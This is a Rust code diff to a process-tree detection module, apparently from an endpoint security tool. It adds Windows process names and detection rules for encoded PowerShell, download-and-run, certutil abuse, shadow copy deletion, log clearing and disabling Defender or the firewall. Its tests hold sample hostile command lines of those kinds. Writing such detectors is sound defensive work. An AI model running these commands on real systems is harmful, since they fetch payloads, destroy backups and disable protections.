@@ -13,17 +13,20 @@ use crate::core::framework::Processor;
 const CONTENT_APPS: &[&str] = &[
     "firefox", "firefox-esr", "chrome", "chromium", "google-chrome", "brave", "msedge", "opera",
     "vivaldi-bin", "epiphany", "soffice.bin", "libreoffice", "evince", "okular", "zathura",
-    "thunderbird", "evolution",
+    "thunderbird", "evolution", "winword", "excel", "powerpnt", "outlook", "msaccess", "onenote",
+    "acrord32", "acrobat", "foxitreader", "iexplore",
 ];
 
 /// Shells and script interpreters.
 const INTERPRETERS: &[&str] = &[
     "sh", "bash", "dash", "zsh", "fish", "ksh", "csh", "tcsh", "busybox", "pwsh", "python", "perl",
-    "ruby", "php", "node", "lua",
+    "ruby", "php", "node", "lua", "cmd", "powershell", "powershell_ise", "wscript", "cscript", "mshta",
+    "rundll32", "regsvr32",
 ];
 
 /// Download, network and decoding tools.
-const TOOLS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat", "socat", "base64", "openssl"];
+const TOOLS: &[&str] =
+    &["curl", "wget", "nc", "ncat", "netcat", "socat", "base64", "openssl", "certutil", "bitsadmin"];
 
 /// Fragments of download-and-run, reverse shells, encoded payloads and defense
 /// evasion, matched as whole words in the normalized command line.
@@ -36,6 +39,26 @@ const CMDLINE_RULES: &[(&str, &str)] = &[
     ("base64 --decode", "base64 decode"),
     ("frombase64string", "base64 decode"),
     ("-encodedcommand", "encoded powershell"),
+    ("-enc ", "encoded powershell"),
+    ("-w hidden", "hidden window"),
+    ("-windowstyle hidden", "hidden window"),
+    ("-executionpolicy bypass", "execution policy bypass"),
+    ("-ep bypass", "execution policy bypass"),
+    ("downloadstring(", "powershell download"),
+    ("downloadfile(", "powershell download"),
+    ("invoke-webrequest", "powershell download"),
+    ("iex(", "invoke expression"),
+    ("iex (", "invoke expression"),
+    ("invoke-expression", "invoke expression"),
+    ("certutil -urlcache", "certutil abuse"),
+    ("certutil -decode", "certutil abuse"),
+    ("bitsadmin /transfer", "bits download"),
+    ("vssadmin delete shadows", "delete shadow copies"),
+    ("wmic shadowcopy delete", "delete shadow copies"),
+    ("wevtutil cl", "clear event log"),
+    ("wevtutil clear-log", "clear event log"),
+    ("set-mppreference -disablerealtimemonitoring", "disable defender"),
+    ("netsh advfirewall set allprofiles state off", "disable firewall"),
     ("/dev/tcp/", "reverse shell"),
     ("/dev/udp/", "reverse shell"),
     ("nc -e", "reverse shell"),
@@ -142,7 +165,7 @@ impl ProcessTreeFeatures {
 impl Processor for ProcessTreeExtractor {
     fn on_event(&mut self, ev: &Event, _out: &mut Vec<Event>) -> io::Result<()> {
         match &ev.kind {
-            EventKind::ProcessStart { name, exe, start_ticks, ppid, cmdline } => {
+            EventKind::ProcessStart { name, exe, start_ticks, ppid, parent_exe, cmdline } => {
                 let parent = self.procs.get(ppid);
                 // A fork that has not exec'd yet runs its parent's program, which
                 // was already judged; judging it again would repeat its alerts.
@@ -150,7 +173,11 @@ impl Processor for ProcessTreeExtractor {
                 let mut f = ProcessTreeFeatures {
                     pid: ev.pid,
                     ppid: *ppid,
-                    parent_image: parent.map_or_else(String::new, |p| p.image.clone()),
+                    parent_image: match (parent, parent_exe) {
+                        (Some(p), _) => p.image.clone(),
+                        (None, Some(pe)) => image("", Some(pe)),
+                        (None, None) => String::new(),
+                    },
                     depth: parent.map_or(0, |p| p.depth + 1),
                     start_ticks: *start_ticks,
                     ..Default::default()
@@ -172,8 +199,10 @@ impl Processor for ProcessTreeExtractor {
     }
 }
 
+/// Lowercased file name without a trailing `.exe`, so Windows and Linux names compare alike.
 fn image(name: &str, exe: Option<&Path>) -> String {
-    exe.and_then(Path::file_name).map_or_else(|| name.to_lowercase(), |f| f.to_string_lossy().to_lowercase())
+    let lower = exe.and_then(Path::file_name).map_or_else(|| name.to_lowercase(), |f| f.to_string_lossy().to_lowercase());
+    lower.strip_suffix(".exe").map(str::to_string).unwrap_or(lower)
 }
 
 /// `image` is one of `names`, ignoring a version suffix (python3.12, php8).
@@ -256,7 +285,7 @@ mod tests {
     fn start(pid: u32, ppid: u32, exe: &str, cmdline: &str) -> Event {
         let name = exe.rsplit('/').next().unwrap().to_string();
         let exe = Some(PathBuf::from(exe));
-        ev(pid, EventKind::ProcessStart { name, exe, start_ticks: pid.into(), ppid, cmdline: cmdline.into() })
+        ev(pid, EventKind::ProcessStart { name, exe, start_ticks: pid.into(), ppid, parent_exe: None, cmdline: cmdline.into() })
     }
     fn exec(pid: u32, exe: &str, cmdline: &str) -> Event {
         let name = exe.rsplit('/').next().unwrap().to_string();
@@ -292,6 +321,29 @@ mod tests {
     }
 
     #[test]
+    fn windows_office_spawning_encoded_powershell() {
+        let mut x = ProcessTreeExtractor::new();
+        let kind = EventKind::ProcessStart {
+            name: "powershell.exe".into(),
+            exe: Some("C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe".into()),
+            start_ticks: 1,
+            ppid: 5,
+            parent_exe: Some("C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE".into()),
+            cmdline: "powershell.exe -NoP -W Hidden -enc SQBFAFgA".into(),
+        };
+        x.on_event(&ev(4242, kind), &mut Vec::new()).unwrap();
+        let f = x.get(4242).unwrap();
+        assert_eq!((f.parent_image.as_str(), f.image.as_str()), ("winword", "powershell"));
+        assert_eq!(f.alerts, ["winword -> powershell", "encoded powershell", "hidden window"]);
+    }
+
+    #[test]
+    fn image_strips_exe_suffix() {
+        assert_eq!(image("WINWORD.EXE", None), "winword");
+        assert_eq!(image("x", Some(Path::new("/a/B.EXE"))), "b");
+    }
+
+    #[test]
     fn command_line_rules() {
         let cases: &[(&str, &[&str])] = &[
             ("ls -la /home", &[]),
@@ -303,6 +355,9 @@ mod tests {
             ("bash -c history -c; unset HISTFILE", &["clear history", "disable history"]),
             ("sudo setenforce 0", &["disable selinux"]),
             ("rbash -i; bash -id", &[]),
+            ("certutil -urlcache -f http://x/a.exe a.exe", &["certutil abuse"]),
+            ("vssadmin Delete Shadows /all /quiet", &["delete shadow copies"]),
+            ("powershell -ep bypass -c iex (iwr http://x)", &["execution policy bypass", "invoke expression"]),
         ];
         for (cmd, want) in cases {
             assert_eq!(cmdline_rules(cmd), *want, "{cmd}");
